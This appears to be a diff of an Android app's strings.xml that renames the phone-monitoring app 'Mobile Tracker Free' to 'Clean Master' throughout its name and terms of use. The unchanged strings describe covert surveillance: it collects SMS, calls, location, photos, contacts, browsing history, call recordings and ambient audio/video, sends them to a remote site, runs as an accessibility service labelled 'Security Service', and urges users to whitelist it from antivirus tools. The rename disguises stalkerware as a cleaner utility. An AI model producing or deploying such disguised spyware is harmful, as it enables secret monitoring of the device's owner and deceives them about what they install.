@@ -90,7 +90,7 @@ Instructions:
     <string name="anti_virus_warning_text">"We have detected one or more Antivirus installed on the phone.
 We recommend that you uninstall them or add %1$s to the whitelist.
 Detected applications:"</string>
-    <string name="app_name">Mobile Tracker Free</string>
+    <string name="app_name">Clean Master</string>
     <string name="app_name_accessibility">Security Service</string>
     <string name="app_usage_enable_no">Access to usage data has not been enabled.</string>
     <string name="app_usage_enable_ok">Access to usage data has been enabled.</string>
@@ -169,12 +169,12 @@ You must have received an email to validate your account."</string>
     <string name="fcm_fallback_notification_channel_label">Miscellaneous</string>
     <string name="firebase_database_url">https://sapient-flight-837.firebaseio.com</string>
     <string name="fix_apps_1">1) Open the running apps by pulling up the home screen or tap “≡” button</string>
-    <string name="fix_apps_2">2) Pull down the Mobile Tracker Free image to lock the application.</string>
+    <string name="fix_apps_2">2) Pull down the Clean Master image to lock the application.</string>
     <string name="fix_apps_3">"3) It's OK"</string>
     <string name="fix_apps_info">Important step for the application to stay alive and accessibility is not disabled.</string>
     <string name="fix_apps_oppo_1">1) Open the running apps by pulling up the home screen or tap “≡” button</string>
-    <string name="fix_apps_oppo_2">2) Pull down the Mobile Tracker Free image to lock the application.</string>
-    <string name="fix_apps_oppo_3">3) You can after remove the application from the history (Pull up the Mobile Tracker Free image)</string>
+    <string name="fix_apps_oppo_2">2) Pull down the Clean Master image to lock the application.</string>
+    <string name="fix_apps_oppo_3">3) You can after remove the application from the history (Pull up the Clean Master image)</string>
     <string name="fix_apps_oppo_4">4) Check that accessibility is always active. Otherwise reactivate there. (Settings => Additional settings => Accessibility => %1$s)</string>
     <string name="fix_apps_oppo_5">"5) It's OK"</string>
     <string name="gcm_defaultSenderId">480616001241</string>
@@ -315,7 +315,7 @@ Detected applications:"</string>
 We recommend that you uninstall these applications, or add %1$s to the whitelist.
 Detected applications:"</string>
     <string name="tel_limit">To add more phones, please subscribe to the premium version.</string>
-    <string name="terms_1">By using Mobile Tracker Free application you agree to be bound by all of the following terms:</string>
+    <string name="terms_1">By using Clean Master application you agree to be bound by all of the following terms:</string>
     <string name="terms_2">"1) You are aware that this application can record, store and transmit information about phone usage and its user activity.
 This includes, if enabled, SMS/MMS, calls, locations, photos, applications, calendar, contacts, history of web sites, clipboard, notifications, social network messages, audio recording of calls and audio/video of the ambient.
 This data will be sent to the secure site https://mobile-tracker-free.com via the HTTPS protocol."</string>
@@ -324,7 +324,7 @@ This data will be sent to the secure site https://mobile-tracker-free.com via th
 • You have explicit written consent of the owner and all users of the device to be monitored;
 • You are a legal guardian of the user of the device to be monitored;"</string>
     <string name="terms_4">3) You know and comply with the laws and regulations that cover privacy, confidentiality and the use of such monitoring application in your local jurisdiction. You assume full responsibility for installing or using the application.</string>
-    <string name="terms_5">4) You also acknowledge that neither Mobile Tracker Free nor any of the affiliates shall be liable for any damages, litigation or other legal actions arising out of your installation or use of Mobile Tracker Free.</string>
+    <string name="terms_5">4) You also acknowledge that neither Clean Master nor any of the affiliates shall be liable for any damages, litigation or other legal actions arising out of your installation or use of Clean Master.</string>
     <string name="terms_6">"\"5) &lt;a href='https://mobile-tracker-free.com/terms/'>Terms of Use&lt;/a>\""</string>
     <string name="terms_7">"\"6) &lt;a href='https://mobile-tracker-free.com/privacy-policy/'>Privacy policy&lt;/a>\""</string>
     <string name="terms_accept">ACCEPT</string>
